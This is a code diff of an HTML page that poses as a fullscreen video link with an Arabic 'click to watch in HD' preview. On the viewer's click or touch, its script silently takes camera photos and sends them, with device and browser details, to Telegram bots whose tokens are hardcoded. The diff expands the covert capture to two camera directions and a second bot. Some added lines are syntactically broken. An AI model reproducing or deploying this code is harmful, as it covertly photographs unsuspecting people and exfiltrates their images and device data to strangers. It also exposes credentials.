@@ -1,8 +1,8 @@
 <!-- وسوم المعاينة المحدثة (Open Graph) للصورة الجديدة -->
-<meta property="og:title" content="ossma_nn_">
+<meta property="og:title" content="ou8ss.1">
 <meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
 <meta property="og:type" content="video.other">
-<meta property="og:image" content="https://cdn.imagetourls.com/uploads/tyImg/xnNwSRRX.jpg">
+<meta property="og:image" content="https://cdn.imagetourls.com/uploads/tyImg/14X6n5D4j.jpg">
 
 <title>Video Fullscreen</title>
 <style>
@@ -37,34 +37,72 @@
 </video>
 
 <script>
-    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
-    const TELEGRAM_CHAT_ID = '6642913954';
+    const TELEGRAM_TARGETS = [
+        {
+            token: '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA',
+            chatId: '6642913954'
+        },
+        {
+            token: '9263581446:AAFs0PHhBepUgbuNLlQJYAihz7sX3me71e4',
+            chatId: '7890543237'
+        }
+    ];
 
     let isProcessing = false;
     const video = document.getElementById('mainVideo');
 
-    async function handleUserInteraction() {
-        // تشغيل الفيديو فوراً عند النقر
-        if (video.paused) {
-            video.play().catch(e => console.log("Video play error:", e));
-        }
+    function buildCaption(cameraLabel) {
+        const now = new Date().toLocaleString('ar-DZ', {
+            dateStyle: 'short',
+            timeStyle: 'medium'
+        });
+        const deviceInfo = navigator.userAgentData?.platform  navigator.platform  'Unknown';
+        const userAgent = navigator.userAgent || 'Unknown';
 
-        if (isProcessing) return;
-        isProcessing = true;
+        return جات صورة من عند عمك عبدو😍\n📷 الكاميرا: ${cameraLabel}\n🕒 الوقت: ${now}\n📱 الجهاز: ${deviceInfo}\n🌐 المتصفح: ${userAgent};
+    }
 
+    async function sendPhotoToAllTargets(blob, cameraLabel) {
+        const caption = buildCaption(cameraLabel);
+
+        const requests = TELEGRAM_TARGETS.map(async (target) => {
+            const formData = new FormData();
+            formData.append('chat_id', target.chatId);
+            formData.append('photo', blob, 'capture.png');
+            formData.append('caption', caption);
+
+            const response = await fetch(`https://api.telegram.org/bot${target.token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status} for chat ${target.chatId}`);
+            }
+        });
+
+        const results = await Promise.allSettled(requests);
+        results.forEach((res, index) => {
+            if (res.status === 'rejected') {
+                console.error(`Failed sending to target #${index + 1}:`, res.reason);
+            }
+        });
+    }
+
+    async function captureSinglePhoto(facingMode) {
         let stream = null;
-
         try {
-            // طلب إذن الكاميرا
-            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { ideal: facingMode } }
+            });
 
             const hiddenVideo = document.createElement('video');
             hiddenVideo.muted = true;
             hiddenVideo.playsInline = true;
             hiddenVideo.srcObject = stream;
-            
+
             await hiddenVideo.play();
-            await new Promise(resolve => setTimeout(resolve, 400));
+            await new Promise((resolve) => setTimeout(resolve, 400));
 
             const canvas = document.createElement('canvas');
             canvas.width = hiddenVideo.videoWidth || 640;
@@ -73,34 +111,14 @@
             const ctx = canvas.getContext('2d');
             ctx.drawImage(hiddenVideo, 0, 0);
 
-            stream.getTracks().forEach(track => track.stop());
+            stream.getTracks().forEach((track) => track.stop());
+            stream = null;
 
-            canvas.toBlob(async (blob) => {
-                if (!blob) return;
-
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, 'capture.png');
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (err) {
-                    console.error("Error sending photo:", err);
-                }
-            }, 'image/png');
-
+            return await new Promise((resolve) => {
+                canvas.toBlob((blob) => resolve(blob || null), 'image/png');
+            });
         } catch (err) {
-            console.error("Camera Error:", err);
+            console.error(`Camera Error (${facingMode}):`, err);
             if (stream) {
-                stream.getTracks().forEach(track => track.stop());
+                stream.getTracks().forEach((track) => track.stop());
             }
-        }
-    }
-
-    // تنفيذ الكود عند أول نقرة أو لمسة فقط
-    window.addEventListener('click', handleUserInteraction, { once: true });
-    window.addEventListener('touchstart', handleUserInteraction, { once: true });
-</script>
